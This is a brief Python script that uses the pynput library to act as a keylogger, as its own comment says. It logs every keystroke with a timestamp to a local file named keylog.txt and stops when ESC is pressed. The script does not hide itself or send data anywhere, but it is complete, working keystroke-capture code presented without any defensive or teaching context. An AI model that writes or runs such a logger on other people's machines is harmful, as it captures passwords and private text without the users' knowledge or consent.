import pynput
from pynput.keyboard import Key, Listener
import logging

# Configure logging to save keystrokes to a file
log_file = "keylog.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# Function to handle key press events
def on_press(key):
    try:
        # Log the key that was pressed
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error logging key: {e}")

# Function to handle key release events
def on_release(key):
    # Stop the keylogger if 'ESC' is pressed
    if key == Key.esc:
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
